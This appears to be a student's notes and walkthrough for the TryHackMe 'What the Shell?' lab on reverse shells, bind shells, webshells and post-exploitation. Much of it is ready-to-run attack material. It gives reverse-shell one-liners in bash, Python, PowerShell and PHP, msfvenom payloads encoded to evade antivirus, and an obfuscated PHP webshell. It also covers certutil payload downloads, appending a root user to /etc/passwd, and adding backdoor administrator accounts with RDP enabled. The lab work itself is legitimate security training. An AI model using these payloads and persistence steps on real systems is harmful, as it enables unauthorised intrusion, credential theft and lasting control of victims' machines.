Room Link: 

[What the Shell?](https://tryhackme.com/room/introtoshells)

## **Common Shell Handling Tools**

When working with **reverse shells** and **bind shells**, we typically use the following tools:

---

### **1. Netcat (The Classic Swiss Army Knife)**

- **Installed by default** on most Linux systems.
- **Simple but unstable** for shells.
- Used for:
    - **Reverse Shells** (victim connects to you)
    - **Bind Shells** (you connect to victim)

**Basic Examples**

**Reverse Shell Listener (Attacker)**

```bash
nc -lvnp 4444
```

**Bind Shell (Victim)**

```bash
nc -lvnp 4444 -e /bin/bash  # Linux
nc -lvnp 4444 -e cmd.exe    # Windows
```

⚠️ **Problem:** Netcat shells are **unstable** (no tab complete, dies easily).

---

### **2. Socat (Netcat on Steroids)**

- **More stable than Netcat** but **not installed by default**.
- **Supports encryption, file transfers, and better TTY handling**.

**Basic Examples**

**Reverse Shell Listener (Attacker)**

```bash
socat TCP-L:4444 -
```

**Reverse Shell (Victim - Linux)**

```bash
socat TCP:<ATTACKER-IP>:4444 EXEC:"bash -li"
```

**Reverse Shell (Victim - Windows)**

```bash
socat TCP:<ATTACKER-IP>:4444 EXEC:powershell.exe,pipes
```

✅ **Advantage:** More stable, better terminal handling.

---

### **3. Metasploit `multi/handler` (For Advanced Payloads)**

- Used for **staged payloads** (e.g., Meterpreter).
- **Auto-handles connections** and provides **post-exploitation modules**.

**Basic Example**

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR-IP>
set LPORT 4444
run
```

💡 **Best for:** Meterpreter, staged payloads, and automated post-exploitation.

---

### **4. Msfvenom (Payload Generator)**

- **Generates reverse/bind shell payloads** in many formats (exe, PHP, Python, etc.).
- Works alongside **`multi/handler`**.

**Basic Examples**

**Linux Reverse Shell (Executable)**

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f elf -o rev_shell.elf
```

**Windows Reverse Shell (EXE)**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR-IP> LPORT=4444 -f exe -o rev_shell.exe
```

📌 **Tip:** Upload to victim → Execute → Catch with **`multi/handler`**.

---

### **5. Other Useful Resources**

- [**PayloadsAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings) – Huge collection of shell payloads.
- [**PentestMonkey Cheatsheet**](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) – Quick reverse shell commands.
- **Kali’s Built-in Webshells** (**`/usr/share/webshells`**) – For web-based shells.

**Which Tool to Use?**

| **Tool** | **Best For** | **Stability** | **Default on Linux?** |
| --- | --- | --- | --- |
| **Netcat** | Quick & dirty shells | Unstable | ✅ Yes |
| **Socat** | Stable shells | Very stable | ❌ No (needs install) |
| **Metasploit** | Meterpreter, automation | Very stable | ✅ (Kali) |
| **Msfvenom** | Custom payloads | Depends on payload | ✅ (Kali) |

---

## **Stabilizing Unstable Netcat Shells**

Netcat shells are **unstable by default**:

- **Ctrl+C kills the shell**
- **No tab completion**
- **Arrow keys don’t work**
- **Weird formatting errors**

Here are **3 techniques** to stabilize them:

### **1. Python TTY Stabilization (Linux Only)**

**Step 1:** Spawn a better shell using Python.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

(Use **`python2`** or **`python3`** if needed.)

**Step 2:** Set terminal type for better compatibility.

```bash
export TERM=xterm
```

**Step 3:** Background the shell (**`Ctrl+Z`**), then fix terminal settings.

```bash
stty raw -echo; fg
```

- **`stty raw -echo`** → Disables local echo (fixes input).
- **`fg`** → Brings the shell back to the foreground.

**If the shell dies:**

```bash
reset  # Restores terminal settings
```

### **2. `rlwrap` for Better History & Autocomplete**

**Install `rlwrap` (Kali Linux):**

```bash
sudo apt install rlwrap
```

**Start the listener with `rlwrap`:**

```bash
rlwrap nc -lvnp <PORT>
```

- **Gives:**
    - **Arrow key support**
    - **Tab completion**
    - **Command history**

**For full stability (Linux):**

1. Background shell (**`Ctrl+Z`**).
2. Run **`stty raw -echo; fg`**.

**Best for:**

- **Windows shells** (Netcat/PowerShell)
- **Linux shells needing basic improvements**

### **3. Upgrade to a Fully Stable Socat Shell (Linux Only)**

If the target has **socat installed** (or you can upload it), use this for a **fully interactive TTY**.

**Listener (Attacker Machine)**

```bash
socat TCP-L:<PORT> FILE:`tty`,raw,echo=0
```

**Victim Machine (Connect Back)**

```bash
socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

- **`pty`** → Allocates a pseudoterminal (stabilizes shell).
- **`stderr`** → Shows errors.
- **`sigint`** → Lets **`Ctrl+C`** work inside shell.
- **`setsid`** → Runs in a new session.
- **`sane`** → Normalizes terminal.

**Bonus:**

```bash
stty rows <num> cols <num>  # Adjust terminal size (check with `stty -a` first)
```

**Encryption Payload with socat**

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

**Listener (Attacker Machine)**

```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

**Victim Machine (Connect Back)**

```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

**Example: Using the tty technique with OPENSSL-LISTEN** 

```bash
# Listener 
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

# Connect back
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

### **Summary Table**

| **Method** | **Best For** | **Pros** | **Cons** |
| --- | --- | --- | --- |
| **Python TTY** | Linux | Simple, no extra tools | Manual steps, no **`Ctrl+C`** |
| **`rlwrap`** | Windows/Linux | Better history & tab-complete | Still needs manual stabilization |
| **Socat** | Linux | **Fully stable TTY** | Requires **`socat`** on target |

---

## **Common Shell Payloads & Msfvenom**

Shell payloads are malicious code snippets that, when executed, create a connection between the attacker and the target machine. They come in two main types:

1. **Reverse Shell** – Victim connects back to the attacker.
2. **Bind Shell** – Attacker connects to a listening port on the victim.

---

### **1. Common Shell Payload Formats**

**A. Reverse Shell Payloads**

**Bash (Linux)**

```bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT>0>&1
```

**Python**

```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<ATTACKER-IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

**PowerShell (Windows)**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER-IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**PHP**

```php
php -r '$sock=fsockopen("<ATTACKER-IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Netcat (Traditional)**

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>  # Linux
nc.exe -e cmd.exe <ATTACKER-IP> <PORT>  # Windows
```

---

**B. Bind Shell Payloads**

**Netcat (Linux)**

```bash
nc -lvnp <PORT> -e /bin/bash
```

**Netcat (Windows)**

```bash
nc.exe -lvnp <PORT> -e cmd.exe
```

**Socat (More Stable)**

```bash
socat TCP-L:<PORT> EXEC:/bin/bash  # Linux
socat TCP-L:<PORT> EXEC:cmd.exe,pipes  # Windows
```

---

### **2. Msfvenom (Metasploit Payload Generator)**

**Msfvenom** is a powerful tool for generating shell payloads in various formats (EXE, Python, PHP, etc.).

**Basic Syntax**

```bash
msfvenom -p <PAYLOAD> LHOST=<ATTACKER-IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```

**Common Payloads**

| **Payload** | **Description** |
| --- | --- |
| **`windows/x64/shell_reverse_tcp`** | Windows Reverse Shell (x64) |
| **`linux/x86/shell_reverse_tcp`** | Linux Reverse Shell (x86) |
| **`php/meterpreter_reverse_tcp`** | PHP Meterpreter Reverse Shell |
| **`java/jsp_shell_reverse_tcp`** | JSP Reverse Shell |

**Examples**

**Windows Reverse Shell (EXE)**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o rev_shell.exe
```

**Linux Reverse Shell (ELF)**

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o rev_shell.elf
```

**PHP Reverse Shell**

```bash
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw -o rev_shell.php
```

**Python Reverse Shell**

```bash
msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py
```

**Staged vs. Stageless Payloads**

| **Type** | **Description** | **Example** |
| --- | --- | --- |
| **Staged** | Small initial payload, downloads the rest later. | **`windows/meterpreter/reverse_tcp`** |
| **Stageless** | Full payload in one file (bigger but more reliable). | **`windows/x64/shell_reverse_tcp`** |

**Naming Convention**

| **Type** | **Format** | **Example** |
| --- | --- | --- |
| **Staged** | **`<OS>/<arch>/meterpreter/<payload_type>`** | **`windows/x64/meterpreter/reverse_tcp`** |
| **Stageless** | **`<OS>/<arch>/shell_<payload_type>`** | **`windows/x64/shell_reverse_tcp`** |

**Key Differences**

| **Feature** | **Staged Payload** | **Stageless Payload** |
| --- | --- | --- |
| **Size** | Small (downloads the rest later) | Larger (all-in-one) |
| **Detection Risk** | Lower (initial payload is tiny) | Higher (full payload in one file) |
| **Reliability** | Depends on network connection | More reliable (no download needed) |
| **Metasploit Handler Required?** | ✅ Yes | ❌ No (but useful for advanced features |

**Staged Payloads**

- Contain **`/meterpreter/`** In the name.
- Example:
    
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe
    ```
    
    - **Requires Metasploit handler** (**`exploit/multi/handler`**).

**Stageless Payloads**

- Contain **`/shell_`** in the name.
- Example:
    
    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe
    ```
    
    - **Works with Netcat/Socat** (no Metasploit required).

---

### **3. Catching Shells**

**Netcat (Basic)**

```bash
nc -lvnp 4444
```

**Metasploit Handler (Advanced)**

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
run
```

---

## Webshell

A **webshell** is a malicious script uploaded to a web server that allows an attacker to execute commands remotely via HTTP requests. It acts as a **backdoor**, enabling control over the server without direct access.

---

### **1. How Webshells Work**

- Uploaded via **file upload vulnerabilities**, **RCE exploits**, or **compromised credentials**.
- Written in **server-side languages** (PHP, ASP, JSP, Python, etc.).
- Accessed via **browser** or **tools like `curl`/Burp Suite**.

**Basic PHP Webshell Example**

```php
<?php system($_GET['cmd']); ?>
```

- **Usage:**
    
    ```html
    http://victim.com/shell.php?cmd=id
    ```
    
    Returns: **`uid=33(www-data) gid=33(www-data) groups=33(www-data)`**
    

---

### **2. Common Webshell Types**

| **Type** | **Language** | **Example** | **Use Case** |
| --- | --- | --- | --- |
| **Simple Command Exec** | PHP | **`<?php system($_GET['cmd']); ?>`** | Basic RCE |
| **Reverse Shell Connector** | PHP/Python | **`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"); ?>`** | Upgrades to full shell |
| **File Manager** | PHP/ASP | **Weevely**, **C99**, **b374k** | File browsing, uploads, DB access |
| **Obfuscated/Encoded** | PHP/JSP | **`<?php eval(base64_decode("PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=")); ?>`** | Bypass WAFs/AV |

---

### **3. Popular Webshell Tools**

| **Tool** | **Description** | **Example** |
| --- | --- | --- |
| **Weevely** | Stealthy PHP webshell with built-in modules | **`weevely generate password123 shell.php`** |
| **C99** | Classic PHP file manager with SQL/command execution | https://i.imgur.com/xyz123.png |
| **b374k** | PHP webshell with terminal-like interface | https://i.imgur.com/abc456.png |
| **ASPXSpy** | .NET webshell for Windows servers | https://i.imgur.com/def789.png |

---

### **4. How Attackers Use Webshells**

1. **Initial Access**
    - Upload via vulnerable file upload forms (e.g., WordPress plugins).
    - Exploit **Local File Inclusion (LFI)** → **Remote File Inclusion (RFI)**.
2. **Persistence**
    - Hide in **`/tmp/`**, **`.htaccess`**, or fake image files (**`shell.jpg.php`**).
3. **Privilege Escalation**
    - Run commands like **`sudo -l`**, **`find / -perm -4000`**, or exploit kernel vulnerabilities.
4. **Lateral Movement**
    - Dump databases (**`mysqldump`**), steal SSH keys, or pivot to internal networks.

---

### **6. Examples**

- Kali’s built-in webshells (**`/usr/share/webshells`**).
- Custom-obfuscated shells to bypass security controls.

**Example: Generating a Stealthy PHP Webshell**

```bash
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
```

Then catch it with:

```bash
nc -lvnp 4444
```

---

## **Stabilizing Shells & Escalating Access**

Unstable, non-interactive shells are common after initial exploitation. The goal is to upgrade to a more stable, native access method.

---

### **Linux Post-Exploitation**

1. **SSH Keys**:
    - Check **`/home/<user>/.ssh/`** for stored keys.
    - Add your public key to **`authorized_keys`** for persistent access.
2. **Credential Hunting**:
    - Search for passwords in files (**`/etc/passwd`**, **`/etc/shadow`**, configs, logs).
    - Use **`grep -Ri "password" /`** or check **`~/.bash_history`**.
3. **Privilege Escalation**:
    - Exploit vulnerabilities (e.g., Dirty Cow) to modify **`/etc/passwd`** or **`/etc/shadow`**.
    - Add a new user:
        
        ```bash
        echo "username:$(openssl passwd -6 password):0:0::/root:/bin/bash" >> /etc/passwd
        ```
        
4. **Service Abuse**:
    - If **`sudo`** or SUID binaries are misconfigured, escalate to root.

---

### **Windows Post-Exploitation**

1. **Credential Hunting**:
    - **Registry**: Check for plaintext service passwords (e.g., VNC, RDP).
        
        ```bash
        reg query HKLM /f "password" /t REG_SZ /s
        ```
        
    - **FileZilla**: Look for **`FileZilla Server.xml`** (credentials may be plaintext/MD5).
2. **User Creation**:
    - Add an admin user for RDP/WinRM access:
        
        ```bash
        net user hacker Password123! /add
        net localgroup administrators hacker /add
        ```
        
    - Enable RDP if disabled:
        
        ```bash
        reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
        ```
        
3. **Pass-the-Hash**:
    - Dump hashes with **`mimikatz`** or **`secretsdump.py`** (Impacket) for lateral movement.

---

**General Tips**

- **Upgrade Shells**: Use tools like **`socat`**, **`script`**, or **`python -c 'import pty; pty.spawn("/bin/bash")'`** for stability.
- **Persistence**:
    - Linux: Cron jobs, SSH keys, backdoor binaries.
    - Windows: Scheduled tasks, registry run keys, WMI subscriptions.
- **Pivot**: Use the compromised host to attack internal networks (e.g., **`chisel`**, **`sshuttle`**).

**Key Takeaway**: Always aim to convert initial shells into native access (SSH, RDP, etc.) for better reliability and stealth.

---

## Linux  Practice Box

### Netcat

**A. reverse shell**

```bash
# Target (conncet back)
nc 10.10.61.237 8080 -e /bin/bash

# Attacker (Listener )
nc -lvnp 8080
```

![image.png](attachment:8bd4b4f7-407a-4b26-b1bf-fe1de8c2925c:image.png)

[Python reverse shell (Linux only)](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python)

```bash
export RHOST="10.10.21.122";export RPORT=4444;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

**B. Bind shell**

```bash
# Listener (Target)
nc -lvnp 4444 -e /bin/bash

# connect back (Attacker)
nc 10.10.246.202 4444
```

![image.png](attachment:7691b1d1-55df-4020-ab3a-3f0f1306ea9f:image.png)

[Python Bind Shell (Linux)](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#python)

```bash
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

[Socat Bind Shell (Linux)](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#socat)

```bash
# Listener (Attacker)
socat FILE:`tty`,raw,echo=0 TCP:target.com:12345

# conncet back (Target)
socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

---

### Netcat Shell Stabilisation

1. **Python method:** 

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
shell@ip-10-10-246-202:~$ export TERM=xterm
export TERM=xterm
shell@ip-10-10-246-202:~$ ^Z
[1]+  Stopped                 nc -lvnp 8080
root@ip-10-10-61-237:~# stty raw -echo;fg
nc -lvnp 8080
shell@ip-10-10-246-202:~$
```

![image.png](attachment:f7a25929-6736-4fc1-a436-be107d19e02d:image.png)

use **`reset`** or **`stty sane`** to restore default settings

---

2. **rlwrap method**

```bash
# Listener (Attacker)
rlwrap nc -lvnp 8080

# background session with Ctrl+Z then restore session back with: 
stty raw -echo;fg
```

![image.png](attachment:dfcaaefa-e26d-437d-8a74-193fe91cb428:image.png)

---

1. **Socat method**

```bash
# Listener (Attacker)
socat TCP-L:8080 -

# Connect Back (Target)
socat TCP:10.10.142.87:8080 EXEC:"bash -li"
```

![image.png](attachment:87609271-ff78-4b23-a8e3-4df2f5e10231:image.png)

Socat with the tty technique

```bash
# Listener
socat TCP-L:443 FILE:`tty`,raw,echo=0

# Connect Back
socat TCP:10.10.142.87:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

![image.png](attachment:52625774-6d27-4152-b3a8-38f8deeaf5a3:image.png)

**Note**: In the Attacker-1 (left terminal), started the reverse shell, and the Attacker-2 caught the connection, as for the Target terminal (Upper right), echoes the Attacker-1 commands

**Socat Encryption Technique**

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

**Reverse-shell (Linux)**

```bash
# Listener 
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 -

# Connect Back
socat OPENSSL:10.10.21.122:4444,verify=0 EXEC:/bin/bash
```

![image.png](attachment:4a9dcbe2-98c2-45b8-92e9-8c494818a0cc:image.png)

**Bind-Shell (Linux)**

```bash
# Listener
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:/bin/bash

# Connect Back
socat OPENSSL:10.10.100.173:4444,verify=0 -
```

![image.png](attachment:686d51f6-bd94-4c41-8a1b-c78c7f1362c2:image.png)

### Webshell

Use built-in webshells in linux: `/usr/share/webshells/php/php-reverse-shell.php` Then, change the connection back IP and the listening port. 

![image.png](attachment:6b3d5ec4-8c74-4a03-818f-f59faf4f6241:image.png)

View the page vulnerable to file uploading, and upload your reverse shell PHP file.

![image.png](attachment:c24e766a-79b7-4ef7-bc83-94d37db47e75:image.png)

Access the uploaded file via:

```bash
curl http://10.10.100.173/uploads/php-reverse-shell.php
```

And at the same time, start the listener

```bash
nc -lvnp 4444
```

Once gained a shell, I stabilized with Python

![image.png](attachment:9172bff7-66f9-4ea5-a17c-dfc33f44f037:image.png)

## Windows Practice box

### Netcat

```bash
# Attacker (Listener)
nc -lvnp 4444

# Target (Connect back)
nc 10.10.148.61 4444 -e "cmd.exe"
```

![image.png](attachment:d23ecc29-442f-409a-a102-d851efe8b8ee:image.png)

### Netcat Shell Stabilization

1. rlwrap 

```bash
# Listener
rlwrap nc -lvnp 4444

# Connect Back
nc 10.10.228.112 4444 -e "cmd.exe"
```

![image.png](attachment:216d477f-bd63-4eaa-ae2a-0ed476faa5bd:image.png)

1. Socat

```bash
# Listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0

# Connect back
socat TCP:<attacker-ip>:<port> EXEC:powershell.exe,pipes
```

1. **Msfvenom**

**Reverse_shell**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.148.61 LPORT=4444 -f exe -e x64/xor -i 10 -o shell_encoded.exe
```

Open an HTTP server on your machine, then download it from the victim machine using`certutil` tool

```bash
certutil -urlcache -split -f http://10.10.148.61:8888/shell_encoded.exe Downloads/shell_encoded.exe
```

![Screenshot 2025-08-10 133826.png](attachment:2305b775-fcad-4a90-ae25-972d6eaea5b8:Screenshot_2025-08-10_133826.png)

Launch msfconsole, use `exploit/multi/handler`. Set the required options, then start the handler 

![image.png](attachment:6bbc7114-3afa-43ea-b55e-ee7b8ee79f7b:image.png)

### Webshell

First, I tried to upload the php-reverse-shell.php file I used for Linux web server, but it returned this error: 

![image.png](attachment:456d196b-d61b-432f-bcf6-a42fc7905bfc:image.png)

The script assumes a **Linux environment** (hence **`daemon`** errors). Windows lacks POSIX functions (**`pcntl_fork()`**), and the shell briefly worked but was likely killed by security tools. To fix this, u**se a Windows-compatible PHP Reverse Shell.** 

https://github.com/Dhayalanb/windows-php-reverse-shell.git

![image.png](attachment:34822836-66b8-49fc-855e-327fff340b20:image.png)

Achieve persistence via adding a new account for RDP/WinRM access:

```bash
# adding new user
net user Aisha Pass1234! /add

# adding the new user to the administrators group
net localgroup Administrators Aisha /add
```

![image.png](attachment:45f255d8-835d-44a8-a8a4-38a995866b19:image.png)

Then login over RDP. 

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.95.11 /u:Aisha /p:'Pass1234!'

```

<img width="1851" height="865" alt="image" src="https://github.com/user-attachments/assets/58c0734a-d514-4263-bd00-05f561ad5788" />
